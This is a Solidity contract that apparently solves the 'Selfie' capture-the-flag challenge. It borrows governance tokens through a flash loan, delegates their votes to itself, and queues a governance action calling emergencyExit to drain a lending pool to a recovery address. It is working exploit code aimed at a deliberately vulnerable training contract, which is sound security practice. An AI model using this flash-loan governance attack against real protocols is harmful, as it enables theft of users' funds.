// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {DamnValuableVotes} from "../DamnValuableVotes.sol";
import {SimpleGovernance} from "./SimpleGovernance.sol";
import {SelfiePool} from "./SelfiePool.sol";

contract SelfieBorrower is IERC3156FlashBorrower {
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    SimpleGovernance public immutable governance;
    SelfiePool public immutable pool;
    address recovery;

    constructor(address _governance, address _pool, address _recovery) {
        governance = SimpleGovernance(_governance);
        pool = SelfiePool(_pool);
        recovery = _recovery;
    }

    function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes calldata data) external override returns (bytes32) {
        uint256 amountWithFee = amount + fee;

        DamnValuableVotes(token).delegate(address(this));
        
        if(data.length > 0) {
            (bool success,) = address(this).call(data);
            require(success, "Action queuing failed");
        }

        DamnValuableVotes(token).approve(address(pool), amountWithFee);
        return CALLBACK_SUCCESS;
    }

    function queAction() external {
        bytes memory emergencyExitCallData = abi.encodeWithSignature(
            "emergencyExit(address)",
            recovery
        );

        governance.queueAction(address(pool), 0, emergencyExitCallData);
    }
}